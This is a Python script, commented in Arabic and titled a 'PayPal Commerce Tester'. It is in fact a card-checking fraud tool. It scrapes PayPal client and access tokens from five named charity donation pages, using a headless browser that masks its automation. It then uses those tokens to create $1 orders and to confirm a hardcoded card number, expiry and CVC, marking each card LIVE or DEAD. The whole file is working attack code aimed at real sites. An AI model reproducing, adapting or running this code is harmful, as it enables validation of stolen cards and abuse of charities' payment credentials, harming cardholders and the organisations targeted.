# -*- coding: utf-8 -*-
"""
PayPal Commerce Tester v2 - مع Playwright
==========================================
"""

import re
import json
import base64
import random
import time
import uuid
import asyncio
import urllib3
from urllib.parse import urlparse

import requests
from fake_useragent import UserAgent

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
SITES = [
    'https://svdpvenicefl.org/donations/donations/',
    'https://riversidefoxfoundation.org/donations/preview/',
    'https://muhammadiyah.org.sg/donate/',
    'https://pieldemariposa.es/en/donate-now/',
    'https://superheroprojectinc.org/donate/',
]

CARD = '4610460307961029|11|2028|549'

UA = UserAgent()

def ua():
    try:
        return UA.random
    except:
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'

def log(section, msg=''):
    if msg:
        print(f'  [{section}] {msg}')
    else:
        print(f'  [{section}]')

def section(title):
    print()
    print('=' * 60)
    print(f'🔍 {title}')
    print('=' * 60)

# ============================================================
# استخراج بـ Playwright
# ============================================================
async def extract_with_playwright(url):
    """فتح متصفح حقيقي واستخراج الـ token"""
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        log('PW', '❌ Playwright not installed')
        return None
    
    captured = {
        'client_token': None,
        'access_token': None,
        'form_data': {},
        'network_requests': [],
    }
    
    async def on_response(resp):
        """مراقبة كل الـ responses"""
        try:
            resp_url = resp.url
            captured['network_requests'].append(resp_url)
            
            # طلب PayPal OAuth
            if 'oauth2/token' in resp_url:
                try:
                    body = await resp.json()
                    if 'access_token' in body:
                        captured['access_token'] = body['access_token']
                        log('PW', f'✅ Access Token from OAuth: {body["access_token"][:40]}...')
                except:
                    pass
            
            # طلب client-token
            if 'client-token' in resp_url or 'client_token' in resp_url:
                try:
                    body = await resp.text()
                    if len(body) > 20:
                        log('PW', f'✅ Client token from API: {body[:50]}')
                        captured['client_token'] = body
                except:
                    pass
            
        except:
            pass
    
    try:
        async with async_playwright() as p:
            log('PW', 'Launching browser...')
            
            browser = await p.chromium.launch(
                headless=True,
                args=['--no-sandbox', '--disable-blink-features=AutomationControlled']
            )
            
            context = await browser.new_context(
                user_agent=ua(),
                viewport={'width': 1366, 'height': 768},
                locale='en-US',
            )
            
            page = await context.new_page()
            
            # تتبع الـ responses
            page.on('response', on_response)
            
            log('PW', f'Opening: {url}')
            
            try:
                await page.goto(url, wait_until='networkidle', timeout=30000)
            except:
                try:
                    await page.goto(url, wait_until='domcontentloaded', timeout=20000)
                except:
                    pass
            
            # انتظر شوية عشان JavaScript يشتغل
            await asyncio.sleep(5)
            
            # احصل على الـ HTML النهائي
            html = await page.content()
            
            # استخرج form data
            form_data = {}
            hidden_inputs = await page.query_selector_all('input[type="hidden"]')
            for inp in hidden_inputs:
                name = await inp.get_attribute('name')
                value = await inp.get_attribute('value')
                if name and value:
                    form_data[name] = value
            
            captured['form_data'] = form_data
            
            # استخرج client_token من HTML
            if not captured['client_token']:
                ct_patterns = [
                    r'"data-client-token"\s*:\s*"([^"]+)"',
                    r'data-client-token="([^"]+)"',
                ]
                for pattern in ct_patterns:
                    m = re.search(pattern, html)
                    if m:
                        captured['client_token'] = m.group(1)
                        log('PW', f'✅ Client Token from HTML: {m.group(1)[:50]}')
                        break
            
            # فك الـ token لو موجود
            if captured['client_token'] and not captured['access_token']:
                try:
                    padding = '=' * (-len(captured['client_token']) % 4)
                    decoded = base64.b64decode(captured['client_token'] + padding).decode('utf-8', errors='ignore')
                    token_data = json.loads(decoded)
                    captured['access_token'] = token_data.get('paypal', {}).get('accessToken')
                    if captured['access_token']:
                        log('PW', f'✅ Access Token decoded: {captured["access_token"][:40]}...')
                except:
                    pass
            
            await browser.close()
            
            return captured
            
    except Exception as e:
        log('PW', f'❌ Error: {str(e)[:100]}')
        return None

def extract_playwright_sync(url):
    """Wrapper sync للـ Playwright"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(asyncio.wait_for(extract_with_playwright(url), timeout=60))
        finally:
            loop.close()
    except asyncio.TimeoutError:
        log('PW', '❌ Timeout (60s)')
        return None
    except Exception as e:
        log('PW', f'❌ Loop error: {str(e)[:100]}')
        return None

# ============================================================
# فحص موقع واحد
# ============================================================
def test_site(url, card):
    section(f'Testing: {url}')
    
    result = {
        'url': url,
        'status': 'UNKNOWN',
        'paypal_response': None,
        'error': None,
        'extraction_method': None,
        'access_token': None,
        'order_id': None,
    }
    
    try:
        access_token = None
        form_data = {}
        
        # ========== 1. جرب Requests أول ==========
        log('1', 'Trying requests first...')
        session = requests.Session()
        session.verify = False
        session.headers.update({'User-Agent': ua()})
        
        try:
            resp = session.get(url, timeout=15)
            html = resp.text
            
            # استخرج form data
            hidden_re = re.compile(
                r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
                re.IGNORECASE
            )
            for name, value in hidden_re.findall(html):
                form_data[name] = value
            
            # استخرج client_token
            ct_patterns = [
                r'"data-client-token"\s*:\s*"([^"]+)"',
                r'data-client-token="([^"]+)"',
            ]
            client_token = None
            for pattern in ct_patterns:
                m = re.search(pattern, html)
                if m:
                    client_token = m.group(1)
                    break
            
            if client_token:
                log('1', '✅ Got client_token from requests')
                try:
                    padding = '=' * (-len(client_token) % 4)
                    decoded = base64.b64decode(client_token + padding).decode('utf-8', errors='ignore')
                    token_data = json.loads(decoded)
                    access_token = token_data.get('paypal', {}).get('accessToken')
                except:
                    pass
        
        except Exception as e:
            log('1', f'⚠️ Requests failed: {str(e)[:50]}')
        
        # ========== 2. لو مفيش token → Playwright ==========
        if not access_token:
            log('2', 'Falling back to Playwright...')
            pw_result = extract_playwright_sync(url)
            
            if pw_result:
                access_token = pw_result.get('access_token')
                if pw_result.get('form_data'):
                    form_data = pw_result['form_data']
                result['extraction_method'] = 'playwright'
        
        if not access_token:
            result['status'] = 'DEAD'
            result['error'] = 'No access token found'
            log('❌', 'No access token')
            return result
        
        result['access_token'] = access_token
        result['extraction_method'] = result['extraction_method'] or 'requests'
        log('✅', f'Access Token: {access_token[:50]}...')
        log('✅', f'Method: {result["extraction_method"]}')
        
        # ========== 3. تحليل الكارت ==========
        parts = card.strip().split('|')
        cc, mm, yy, cvc = parts
        if '20' in yy:
            yy = yy.split('20')[1]
        expiry = f'20{yy}-{mm}'
        
        # ========== 4. Create Order ==========
        log('3', 'Creating PayPal order...')
        
        create_headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': ua(),
        }
        
        create_body = {
            'intent': 'CAPTURE',
            'purchase_units': [{
                'amount': {'currency_code': 'USD', 'value': '1.00'},
            }],
        }
        
        create_resp = requests.post(
            'https://api-m.paypal.com/v2/checkout/orders',
            headers=create_headers,
            json=create_body,
            timeout=20
        )
        
        log('3', f'Status: {create_resp.status_code}')
        
        if create_resp.status_code == 401:
            result['status'] = 'DEAD'
            result['error'] = 'Access token expired (401)'
            log('❌', 'Token expired!')
            return result
        
        if create_resp.status_code not in (200, 201):
            log('3', f'Response: {create_resp.text[:200]}')
            result['status'] = 'DEAD'
            result['error'] = f'Create Order: {create_resp.status_code}'
            return result
        
        order_id = create_resp.json().get('id')
        result['order_id'] = order_id
        log('✅', f'Order: {order_id}')
        
        # ========== 5. Confirm Payment ==========
        log('4', 'Confirming payment...')
        
        confirm_headers = {
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
            'User-Agent': ua(),
            'PayPal-Request-Id': str(uuid.uuid4()),
        }
        
        confirm_body = {
            'payment_source': {
                'card': {
                    'number': cc,
                    'expiry': expiry,
                    'security_code': cvc,
                }
            },
        }
        
        confirm_resp = requests.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
            headers=confirm_headers,
            json=confirm_body,
            timeout=20
        )
        
        log('4', f'Status: {confirm_resp.status_code}')
        
        try:
            confirm_json = confirm_resp.json()
        except:
            confirm_json = {}
        
        log('4', f'Response: {json.dumps(confirm_json, ensure_ascii=False)[:300]}')
        
        # ========== 6. تصنيف الرد ==========
        log('5', 'Analyzing...')
        
        if confirm_resp.status_code in (200, 201):
            result['status'] = 'LIVE'
            result['paypal_response'] = 'CONFIRMED - Card accepted'
            log('🎉', 'Card CONFIRMED')
        else:
            name = confirm_json.get('name', '')
            details = confirm_json.get('details', [])
            
            if details:
                issue = details[0].get('issue', '')
                desc = details[0].get('description', '')
                result['paypal_response'] = f'{issue}: {desc}'
                
                if issue == 'PAYER_CANNOT_PAY':
                    result['status'] = 'LIVE'  # رد PayPal حقيقي
                elif 'INSUFFICIENT' in issue.upper():
                    result['status'] = 'LIVE'
                elif 'EXPIRED' in issue.upper():
                    result['status'] = 'LIVE'
                else:
                    result['status'] = 'LIVE'
            else:
                result['paypal_response'] = name or confirm_resp.text[:100]
                result['status'] = 'LIVE'
            
            log('📊', f'{result["paypal_response"]}')
        
        return result
        
    except Exception as e:
        result['status'] = 'ERROR'
        result['error'] = str(e)[:100]
        log('❌', f'Exception: {str(e)[:100]}')
        return result

# ============================================================
# التشغيل
# ============================================================
def main():
    print()
    print('╔' + '═' * 58 + '╗')
    print('║' + ' ' * 12 + 'PayPal Tester v2 - Playwright' + ' ' * 17 + '║')
    print('╚' + '═' * 58 + '╝')
    print()
    print(f'💳 Card: {CARD}')
    
    # تحقق من Playwright
    try:
        from playwright.sync_api import sync_playwright
        print('✅ Playwright installed')
    except ImportError:
        print('❌ Playwright not installed - run:')
        print('   pip install playwright')
        print('   playwright install chromium')
        return
    
    results = []
    
    for i, url in enumerate(SITES, 1):
        print(f'\n▶️  Site {i}/{len(SITES)}')
        
        try:
            result = test_site(url, CARD)
            results.append(result)
        except Exception as e:
            print(f'❌ Fatal: {e}')
            results.append({'url': url, 'status': 'FATAL', 'error': str(e)[:100]})
        
        if i < len(SITES):
            print(f'\n⏳ Waiting 5s...')
            time.sleep(5)
    
    # الملخص
    print()
    print('╔' + '═' * 58 + '╗')
    print('║' + ' ' * 20 + 'SUMMARY' + ' ' * 31 + '║')
    print('╚' + '═' * 58 + '╝')
    print()
    
    live = sum(1 for r in results if r['status'] == 'LIVE')
    dead = sum(1 for r in results if r['status'] == 'DEAD')
    
    for i, r in enumerate(results, 1):
        icon = '✅' if r['status'] == 'LIVE' else '❌'
        print(f'{i}. {icon} {r["url"]}')
        print(f'   Status: {r["status"]}')
        if r.get('extraction_method'):
            print(f'   Method: {r["extraction_method"]}')
        if r.get('access_token'):
            print(f'   Token: {r["access_token"][:40]}...')
        if r.get('paypal_response'):
            print(f'   PayPal: {r["paypal_response"]}')
        if r.get('error'):
            print(f'   Error: {r["error"]}')
        print()
    
    print('=' * 60)
    print(f'📊 TOTAL: {len(results)} | ✅ LIVE: {live} | ❌ DEAD: {dead}')
    print('=' * 60)
    
    with open('results_v2.json', 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)
    print(f'\n💾 Saved: results_v2.json')

if __name__ == '__main__':
    main()
